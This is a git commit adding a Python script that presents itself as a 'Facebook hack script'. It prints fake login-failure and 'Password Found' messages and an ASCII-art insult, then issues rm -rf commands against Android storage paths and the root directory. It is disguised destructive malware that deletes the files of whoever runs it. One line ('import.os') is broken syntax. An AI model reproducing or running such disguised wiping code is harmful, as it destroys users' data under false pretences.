51b6bbe76e27e4f203df4eb16d0671950dbea00b
Mr.V1P3R <109334868+Knownasjohnn@users.noreply.github.com>
2022-10-16 08:32:06 +0800

    Add files via upload

---
+++ kazutorafacebookhackscript.py
@@ -0,0 +1,58 @@
+print("\033[1;31;40m KAZUTORA FACEBOOK HACK SCRIPT")
+
+
+
+
+
+
+
+
+
+
+
+
+input("Target:")
+import time
+time.sleep(1)
+print("login failed")
+time.sleep(1)
+print("login failed")
+time.sleep(1)
+print("login failed")
+time.sleep(1)
+print("login failed")
+time.sleep(1)
+print("login failed")
+time.sleep(1)
+print("login failed")
+time.sleep(1)
+print("\033[1;31;40m Failed \n")
+time.sleep(1)
+print("\033[1;31;40m Failed \n")
+time.sleep(1)
+print("\033[1;31;40m Failed  \n")
+time.sleep(1)
+print("\033[1;31;40m Failed  \n")
+time.sleep(1)
+print("\033[1;32;40m Password Found  \n")
+time.sleep(2)
+print("\033[1;32;1m generating password")
+time.sleep(1)
+print(" _______                _        _     _                ")
+print("(_______)              | |      | |   | |              ")
+print(" _____    _   _   ____ | |  _   | |___| |  ___   _   _")
+print("|  ___)  | | | | / ___)| |_/ )  |_____  | / _ \ | | | |")
+print("| |      | |_| |( (___ |  _ (    _____| || |_| || |_| |")
+print("|_|      |____/  \____)|_| \_)  (_______| \___/ |____/ ")
+import.os
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
+
+
+
+
